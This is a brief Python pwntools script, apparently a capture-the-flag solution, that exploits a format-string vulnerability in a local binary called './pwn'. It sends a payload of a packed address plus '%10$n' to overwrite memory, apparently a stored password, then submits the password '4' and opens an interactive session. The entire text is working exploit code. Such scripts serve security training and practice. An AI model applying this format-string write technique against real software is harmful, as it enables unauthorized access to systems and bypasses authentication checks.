from pwn import *
r=process('./pwn')
payload=p32(0x0804C044)+b"%10$n"
print(payload)
r.sendafter(b"name:",payload)
r.sendafter(b"passwd:",b"4")
r.interactive()

